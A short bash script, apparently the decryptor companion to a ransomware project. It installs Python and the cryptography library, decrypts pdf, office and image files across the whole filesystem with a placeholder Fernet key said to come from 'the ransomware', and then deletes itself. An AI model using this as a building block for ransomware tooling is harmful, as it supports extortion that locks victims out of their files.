#!/bin/bash

apt-get install python3 -y
apt install python3-pip -y
pip install cryptography

PY_SH=$(cat <<EOF
#!/usr/bin/python3
# -*- coding: utf-8 -*-

import glob
import os
import sys
from cryptography.fernet import Fernet
from pathlib import Path

print("starting...\n")
KEY = Fernet(b'key_generated_by_the_ransomware_and_printed_in_console')

extensions_list = ["pdf", "docx", "xlsx", "png", "jpg", "jpeg"]

def notify(file_path):
	try:
		with open(file_path, "rb") as encrypted_file:
			encrypted = encrypted_file.read()
		decrypted = KEY.decrypt(encrypted)
		with open(file_path, "wb") as decrypted_file:
			decrypted_file.write(decrypted)
		print(file_path)
	except:
		pass

print("decrypting...\n")
for extension in extensions_list:
	for file_path in Path("/").rglob("*."+extension):
		notify(file_path)
		

EOF
)
python3 -c "$PY_SH"

rm -f decrypter.sh